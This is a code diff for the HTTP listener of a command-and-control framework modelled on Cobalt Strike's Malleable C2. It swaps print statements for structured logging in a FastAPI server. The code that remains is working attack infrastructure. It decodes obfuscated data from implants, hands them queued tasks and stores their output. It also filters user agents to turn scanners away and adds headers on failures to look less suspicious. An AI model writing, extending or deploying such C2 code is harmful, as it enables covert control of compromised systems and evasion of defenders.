@@ -13,10 +13,18 @@ codes used.
 500: something went wrong
 """
 
+import logging
 import re
+import sys
+from logging.handlers import RotatingFileHandler
+from pathlib import Path
 
 import msgpack
+
+# NEW: Structlog imports
+import structlog
 import uvicorn
+from concurrent_log_handler import ConcurrentRotatingFileHandler
 from fastapi import FastAPI, HTTPException, Request, Response, status
 from mpp import MalleableProfile
 from starlette.middleware.base import BaseHTTPMiddleware
@@ -35,6 +43,8 @@ from ..malc2 import (
 app = FastAPI
 mp = MalleableProfile
 
+listener_logger = structlog.get_logger("listener")
+
 
 # entrypoint
 def run(listener_uuid: str):
@@ -45,9 +55,13 @@ def run(listener_uuid: str):
     """
     # make mp global to this module so we don't have to  read from it/pass everywhere constantly
     global mp, app
+
     # placeholder
     mp = MalleableProfile(profile="/home/ubuntu-dev/LongHaulC2/webbug_getonly.profile")
-    print(mp)
+
+    # structlog: Bind global context for this listener process
+    structlog.contextvars.bind_contextvars(listener_uuid=listener_uuid)
+    listener_logger.info("listener_startup", profile=str(mp.profile))
 
     # to shutoff docs
     # app = FastAPI(
@@ -119,11 +133,11 @@ def check_user_agent(user_agent) -> bool:
     """
     try:
         mp.http_config
-        # print("http-config block not found")
+        # listener_logger.debug("http-config block not found")
         # return False
     except Exception as e:
-        print(e)
-        print("http-config block not found")
+        listener_logger.debug("config_block_error", error=str(e))
+        listener_logger.debug("http-config block not found")
         # no block set, so every user agent is okay
         return True
 
@@ -133,8 +147,8 @@ def check_user_agent(user_agent) -> bool:
     blocked_useragents = hcbsp.get_blocked_user_agents()
     allowed_useragents = hcbsp.get_allowed_user_agents()
 
-    print("Blocked user agents:", blocked_useragents)
-    print("Allowed user agents:", allowed_useragents)
+    # listener_logger.debug("Blocked user agents:", blocked_useragents)
+    # listener_logger.debug("Allowed user agents:", allowed_useragents)
 
     # First, check for blocked user agents
     if blocked_useragents:
@@ -144,7 +158,9 @@ def check_user_agent(user_agent) -> bool:
 
             # Check if the user-agent matches the pattern
             if re.match(regex, user_agent):
-                print(f"Blocked by pattern: {pattern}")
+                listener_logger.debug(
+                    "user_agent_blocked", pattern=pattern, ua=user_agent
+                )
                 return False  # Blocked agent
 
     # If blocked_useragents passed, we don't need to check allowed_useragents
@@ -156,11 +172,13 @@ def check_user_agent(user_agent) -> bool:
 
             # Check if the user-agent matches the pattern
             if re.match(regex, user_agent):
-                print(f"Allowed by pattern: {pattern}")
+                listener_logger.debug(
+                    "user_agent_allowed", pattern=pattern, ua=user_agent
+                )
                 return True  # Allowed agent
 
     # Default return if no matches were found
-    # print("User-agent not allowed (no matching patterns found)")
+    # listener_logger.debug("User-agent not allowed (no matching patterns found)")
     return True  # Default to allow through if not in blocked, and there's nothign in
 
 
@@ -177,41 +195,15 @@ async def deobsfucate_malleable_c2_request_data(
 ) -> bytes:
     """
     Extracts data from the HTTP request based on the specified terminator type.
-    This function is designed to work with the FastAPI `Request` object to extract
-    relevant data (e.g., headers, query parameters, or body content) based on the
-    configured extraction method.
-
-    The function is tightly coupled with the HTTP request structure, making it
-    suitable for use in FastAPI endpoints that process incoming requests.
-
-    Parameters:
-    - request (Request): The FastAPI `Request` object containing the HTTP request data.
-    - terminator_type (str): Specifies the type of terminator used to define where to extract the data from. Possible values are:
-        - "header": Extracts data from the HTTP headers.
-        - "parameter": Extracts data from URL query parameters.
-        - "print": Extracts data from the request body.
-    - terminator_key (str, optional): The key used to identify the specific data within the terminator type. For example, the header or parameter name. This is only required for certain terminator types (like "header" or "parameter").
-    - Malleable C2 block: The block to get values from: ex: mp.http_get.client if decoding an inbound GET request
-    - parser_class: The parser class used to extract data. Ex, HttpPostBlockServerParser. Needed because each class has some block specific options
-
-    Returns:
-    - bytes: The extracted data
-
-    Raises:
-    - ValueError: If an unsupported `terminator_type` is provided.
-    - Exception: If there is an error during the data extraction or transformation process.
-
-    Notes:
-    - This function assumes the `request` object is passed, which is required for data extraction from headers, query parameters, and the body. It is specifically designed for FastAPI endpoints.
-    - The function includes basic error handling, raising exceptions when an unsupported terminator type is provided or if data extraction fails.
     """
     match terminator_type:
         case "header":
-            print(request.headers)
+            # listener_logger.debug(request.headers)
             normalized_headers = {k.lower(): v for k, v in request.headers.items()}
             data_from_request = normalized_headers.get(terminator_key.lower())
-            print(f"Looking for data in header: {terminator_key}")
-            print(f"Data from request: {data_from_request}")
+
+            listener_logger.debug("extracting_header", key=terminator_key)
+            # listener_logger.debug(f"Data from request: {data_from_request}")
             check_if_data(data_from_request)
 
             try:
@@ -219,15 +211,19 @@ async def deobsfucate_malleable_c2_request_data(
                 data = hce.apply_transforms(
                     data=data_from_request, block_field=block_field
                 )
-                print(f"De-Obsfucated data: {data}")
+                listener_logger.debug(
+                    "deobfuscation_complete", type="header", len=len(data)
+                )
                 return data
             except Exception as e:
-                print(e)
+                listener_logger.error(
+                    "deobfuscation_failed", error=str(e), type="header"
+                )
                 raise e
 
         case "parameter":
             data_from_request = request.query_params.get(terminator_key)
-            print(f"Data from request: {data_from_request}")
+            # listener_logger.debug(f"Data from request: {data_from_request}")
 
             check_if_data(data_from_request)
 
@@ -236,10 +232,14 @@ async def deobsfucate_malleable_c2_request_data(
                 data = hce.apply_transforms(
                     data=data_from_request, block_field=block_field
                 )
-                print(f"De-Obsfucated data: {data}")
+                listener_logger.debug(
+                    "deobfuscation_complete", type="parameter", len=len(data)
+                )
                 return data
             except Exception as e:
-                print(e)
+                listener_logger.error(
+                    "deobfuscation_failed", error=str(e), type="parameter"
+                )
                 raise e
         case "print":
             # in body, so just get body
@@ -250,14 +250,18 @@ async def deobsfucate_malleable_c2_request_data(
             try:
                 hce = parser_class(client_block=malleable_c2_block)
                 data = hce.apply_transforms(data=data_from_request)
-                print(f"De-Obsfucated data: {data}")
+                listener_logger.debug(
+                    "deobfuscation_complete", type="print", len=len(data)
+                )
                 return data
             except Exception as e:
-                print(e)
+                listener_logger.error(
+                    "deobfuscation_failed", error=str(e), type="print"
+                )
                 raise e
         case _:
             # unknown terminator
-            print("Unknown terminator: %r", terminator_type)
+            listener_logger.error("unknown_terminator", terminator=terminator_type)
             # throw error cuz we can't continue if we don't have the task
             raise ValueError
 
@@ -280,8 +284,7 @@ class HeadersMiddleware(BaseHTTPMiddleware):
         try:
             mp.http_config
         except Exception as e:
-            print(e)
-            print("http-config block not found")
+            listener_logger.debug("http_config_not_found", error=str(e))
             # pass all processing, just return response
             return response
 
@@ -296,16 +299,11 @@ class HeadersMiddleware(BaseHTTPMiddleware):
             if header in response.headers:
                 """
                 Ignore header if it already exists.
-                https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-server-config.htm#_Toc65482845
-
-                header - This keyword adds a header value to each of Cobalt Strike’s HTTP
-                responses. If the header value is already defined in a response, this value
-                is ignored.
                 """
                 continue
 
             # then add
-            print(f"Adding header: {header}: {value}")
+            # listener_logger.debug(f"Adding header: {header}: {value}")
             response.headers[header] = value
 
             # could just replace too instead of deleting.
@@ -323,7 +321,7 @@ class HeadersMiddleware(BaseHTTPMiddleware):
             Note: Date seems to show up first every time for some reason. 
         """
         response.init_headers(headers=ordered_headers)
-        print(response.headers)
+        # listener_logger.debug(response.headers)
 
         return response
 
@@ -340,20 +338,20 @@ HTTP POST with CS is where task data is retrieved from the server.
 async def http_get(request: Request) -> Response:
     """
     HTTP GET endpoint for the HTTP listener.
-
-    Note:
-    - Accepts all URL parameters via **kwargs.
-    - OpenAPI parameter documentation is not generated due to the **kwargs
-    - This design enables a more flexible and malleable C2 interface.
-
-    !!Holy shit clean this all up
     """
+    # STRUCTLOG: Clean context and bind Request info
+    structlog.contextvars.clear_contextvars()
+    structlog.contextvars.bind_contextvars(
+        method="GET", ip=request.client.host, path=request.url.path
+    )
+
     # security checks
     user_agent = request.headers.get("user-agent")
-    print(user_agent)
+    listener_logger.debug("incoming_request", ua=user_agent)
 
     # 404 on fail. Can't sinkhole without extra setup/steps atm.
     if not check_user_agent(user_agent):
+        listener_logger.warning("request_blocked_ua")
         return Response(status_code=404)
 
     """
@@ -373,9 +371,9 @@ async def http_get(request: Request) -> Response:
             block_field=mp.http_get.client.metadata,  # use metadata field to extract
             parser_class=HttpGetBlockClientParser,
         )
-        print(f"Data from implant: {data_from_implant}")
+        listener_logger.debug("payload_extracted", len=len(data_from_implant))
     except Exception as e:
-        print(e)
+        listener_logger.error("get_processing_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     response = http_response(data_from_implant=data_from_implant)
@@ -387,16 +385,19 @@ async def http_get_uri(request: Request) -> Response:
     Same as the http_get method, but URI specific, as that requires extra handling on the fastapi
     side.
     """
-    try:
-        print(request)
-        path = request.url.path
-        print("Full path:", path)
+    # STRUCTLOG: Clean context and bind Request info
+    structlog.contextvars.clear_contextvars()
+    structlog.contextvars.bind_contextvars(
+        method="GET_URI", ip=request.client.host, path=request.url.path
+    )
 
+    try:
+        path = request.url.path
         # Last segment
         data_in_uri = path.rstrip("/").split("/")[-1]
-        print("Last data_in_uri:", data_in_uri)
+        listener_logger.debug("extracting_uri_data", segment=data_in_uri)
     except Exception as e:
-        print(e)
+        listener_logger.error("uri_parse_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     # we can assume URI terminator is uri-append.
@@ -407,10 +408,11 @@ async def http_get_uri(request: Request) -> Response:
         deobsfucated_data_from_implant = hce.apply_transforms(
             data=data_in_uri, block_field=mp.http_get.client.metadata
         )
-        print(f"De-Obsfucated data: {deobsfucated_data_from_implant}")
-        print(f"Data from implant: {data_in_uri}")
+        listener_logger.debug(
+            "deobfuscation_complete", len=len(deobsfucated_data_from_implant)
+        )
     except Exception as e:
-        print(e)
+        listener_logger.error("deobfuscation_failed", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     response = http_response(data_from_implant=deobsfucated_data_from_implant)
@@ -420,12 +422,6 @@ async def http_get_uri(request: Request) -> Response:
 def http_response(data_from_implant):
     """
     Setup a response for the implant.
-
-
-    Takes the deobsfucated data, and then based on malleable c2, stores data, and then
-    generates a response
-
-    This was defined 2 times beore, so I consolidated the func
     """
 
     # take extracted data, shove into class:
@@ -434,28 +430,33 @@ def http_response(data_from_implant):
         md = Metadata(unpacked_metadata)
         md.validate()  # , if err return 400 malformed
     except Exception as e:
-        print(e)
+        listener_logger.error("metadata_validation_failed", error=str(e))
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
             detail=f"Malformed data",
         )
 
     # note, payload would need to be inserted somehwere here too.  Ex,
-    # redis lookup for next task -> insert where print it
+    # redis lookup for next task -> insert where listener_logger.debug it
     # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
     implant_uuid = unpacked_metadata.get("implant_uuid", None)
     check_if_data(implant_uuid)
 
-    print("Warning: implant metadata not currently being stored")
+    # STRUCTLOG: Bind the ID to the context! Now all subsequent logs in this flow have the ID.
+    structlog.contextvars.bind_contextvars(implant_id=implant_uuid)
+
+    # listener_logger.debug("Warning: implant metadata not currently being stored")
     # store metadata at all? Maybe a metadata field in agent table, that gets updated (only on change)
 
     its = RedisImplantTaskService(implant_uuid)
     msgpack_task = its.dequeue_task()
     if not msgpack_task:
-
+        listener_logger.info("checkin_no_task")
         raise HTTPException(
             status_code=204  # 204 for no content, but the request suceeded.
         )
+
+    listener_logger.info("checkin_task_queued")
 
     # pass in block to respective class
     # get the stuff we need from it
@@ -463,32 +464,13 @@ def http_response(data_from_implant):
     headers = emitter.headers()
     obsfucated_task = emitter.generate_data(msgpack_task)
 
-    """
-    Statement 	        What
-    ------------------------------------------------
-    header "header" 	Store data in an HTTP header
-    parameter "key" 	Store data in a URI parameter
-    print 	            Send data as transaction body
-    uri-append 	        Append to URI (seperate function, see http_get_uri)
-    """
     terminator_type, target = emitter.get_output_terminator()
 
-    # The print statement is the expected termination statement for the http-get.server.output, http- post.server.output, and http-stager.server.output blocks. You may use the header, parameter, print and uri-append termination statements for the other blocks.
-    """
-        Big note here: Traditional Malleable C2/Beacon only supports 
-        the `print` terminator for responses for
-        http-get.server.output, http- post.server.output, and http-stager.server.output blocks.
-
-        This seems like an overcomeable limitation, especially with the header field (can hide data there), 
-        but for now, I'll stick to spec. 
-        
-        https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482842
-    """
     match terminator_type:
 
         # case "header":
         #     # send data in a header
-        #     headers[target] = obsfucated_task
+        #     # headers[target] = obsfucated_task
         #     # construct response here
 
         case "print":
@@ -499,7 +481,9 @@ def http_response(data_from_implant):
 
         case _:
             # unknown terminator
-            print("Unknown terminator: %r", terminator_type)
+            listener_logger.error(
+                "unknown_server_terminator", terminator=terminator_type
+            )
             # note still sent headers to make it somewhat less suspicous
             return Response(status_code=500, headers=headers)
 
@@ -516,17 +500,19 @@ HTTP POST with CS is where task response data is sent back to
 async def http_post(request: Request) -> Response:
     """
     HTTP POST endpoint for the HTTP listener.
-
-    Note:
-    - Accepts all URL parameters via **kwargs.
-    - OpenAPI parameter documentation is not generated due to the **kwargs
-    - This design enables a more flexible and malleable C2 interface.
-
     """
+    # STRUCTLOG: Clean context and bind Request info
+    structlog.contextvars.clear_contextvars()
+    structlog.contextvars.bind_contextvars(
+        method="POST", ip=request.client.host, path=request.url.path
+    )
+
     user_agent = request.headers.get("user-agent")
-    print(user_agent)
+    listener_logger.debug("incoming_request", ua=user_agent)
+
     # 404 on fail. Can't sinkhole without extra setup/steps atm.
     if not check_user_agent(user_agent):
+        listener_logger.warning("request_blocked_ua")
         return Response(status_code=404)
     """
     Handle inputted data form fastapi.
@@ -554,9 +540,9 @@ async def http_post(request: Request) -> Response:
             block_field=mp.http_post.client.output,
             parser_class=HttpPostBlockClientParser,
         )
-        print(f"Data from implant: {data_from_implant}")
+        listener_logger.debug("post_output_extracted", len=len(data_from_implant))
     except Exception as e:
-        print(e)
+        listener_logger.error("post_output_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     try:
@@ -576,9 +562,13 @@ async def http_post(request: Request) -> Response:
             block_field=mp.http_post.client.id,
             parser_class=HttpPostBlockClientParser,
         )
-        print(f"Implant ID: {implant_uuid}")
+
+        # STRUCTLOG: Bind ID
+        structlog.contextvars.bind_contextvars(implant_id=str(implant_uuid))
+        listener_logger.info("implant_id_extracted")
+
     except Exception as e:
-        print(e)
+        listener_logger.error("post_id_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     response = http_post_response(
@@ -588,34 +578,24 @@ async def http_post(request: Request) -> Response:
 
 
 async def http_post_uri(request: Request, data: str) -> Response:
-    """POST endpoint specifially for the 'uri-append' option in malleable c2
-
-    Args:
-        request (Request): The request object
-        data (str): The URI-appended url. Ex: /fkajskdlfjsdaklfasdlkfsjadkfl
-
-    Raises:
-        HTTPException: _description_
-        HTTPException: _description_
-
-    Returns:
-        Response: Returns a response for FastAPI to send back to the implant
-    """
+    """POST endpoint specifially for the 'uri-append' option in malleable c2"""
+    # STRUCTLOG: Clean context and bind Request info
+    structlog.contextvars.clear_contextvars()
+    structlog.contextvars.bind_contextvars(
+        method="POST_URI", ip=request.client.host, path=request.url.path
+    )
 
     # we can assume URI terminator is uri-append.
     # data is the /someendpoint/<HERE>, so we just need to transform it.
 
-    full_uri = str(
-        request.url
-    )  # Full URL including the scheme, host, path, and query params. useful for logging
+    # full_uri = str(
+    #     request.url
+    # )  # Full URL including the scheme, host, path, and query params. useful for logging
 
     try:
         hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
         output_terminator_type, output_terminator_key = hce.get_output_terminator()
 
-        # print("output term, output key")
-        # print(output_terminator_type)
-        # print(output_terminator_key)
         # check if keys, ifnot, throw a 400 (it's a server error though - so maybe change later)
         check_if_data(output_terminator_type)
         check_if_data(output_terminator_key)
@@ -628,9 +608,10 @@ async def http_post_uri(request: Request, data: str) -> Response:
             block_field=mp.http_post.client.output,
             parser_class=HttpPostBlockClientParser,
         )
+        listener_logger.debug("post_uri_output_extracted")
 
     except Exception as e:
-        print(e)
+        listener_logger.error("post_uri_output_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     try:
@@ -650,9 +631,12 @@ async def http_post_uri(request: Request, data: str) -> Response:
             block_field=mp.http_post.client.id,
             parser_class=HttpPostBlockClientParser,
         )
-        print(f"Implant ID: {implant_uuid}")
+        # STRUCTLOG: Bind ID
+        structlog.contextvars.bind_contextvars(implant_id=str(implant_uuid))
+        listener_logger.info("implant_id_extracted")
+
     except Exception as e:
-        print(e)
+        listener_logger.error("post_uri_id_error", error=str(e))
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
 
     response = http_post_response(
@@ -677,35 +661,29 @@ def http_post_response(data_from_implant, implant_uuid):
     rits = RedisImplantTaskService(implant_uuid)
     rits.enqueue_response(data_from_implant)
 
-    """
-    Statement 	        What
-    ------------------------------------------------
-    header "header" 	Store data in an HTTP header
-    parameter "key" 	Store data in a URI parameter
-    print 	            Send data as transaction body
-    uri-append 	        Append to URI (seperate function, see http_post_uri)
-    """
+    listener_logger.info("task_response_enqueued")
+
     terminator_type, target = emitter.get_output_terminator()
 
-    # adjust to print
+    # adjust to listener_logger.debug
     # also, find out what data the server sends back on a post.
     # it's somhwere in those malleable c2 docs with the flow of a req.
     # looks to be emptyy.
 
     """
-    Request 	Component 	Block 	    Data
-    http-get 	client 	    metadata 	Session metadata
-    http-get 	server 	    output 	    Beacon’s tasks
-    http-post 	client 	    id 	        Session ID
-    http-post 	client 	    output 	    Beacon’s responses
-    http-post 	server 	    output 	    Empty
-    http-stager server 	    output 	    Encoded payload stage
+    Request     Component   Block       Data
+    http-get    client      metadata    Session metadata
+    http-get    server      output      Beacon’s tasks
+    http-post   client      id          Session ID
+    http-post   client      output      Beacon’s responses
+    http-post   server      output      Empty
+    http-stager server      output      Encoded payload stage
     """
 
     match terminator_type:
         # case "header":
         #     # send data in a header
-        #     headers[target] = data
+        #     # headers[target] = data
         #     # construct response here
 
         case "print":
@@ -715,7 +693,9 @@ def http_post_response(data_from_implant, implant_uuid):
 
         case _:
             # unknown terminator
-            print("Unknown terminator: %r", terminator_type)
+            listener_logger.error(
+                "unknown_server_terminator", terminator=terminator_type
+            )
             # note still sent headers to make it somewhat less suspicous
             return Response(status_code=500, headers=headers)
 
@@ -758,7 +738,3 @@ def register_http_route(uri: URL, method: str, endpoint, uri_endpoint):
 
     This way, FastAPI can process both the static and dynamic parts of the URL correctly.    
     """
-
-
-# name == main linter here? ex, setup and show what a request might look like?
-# not a must.
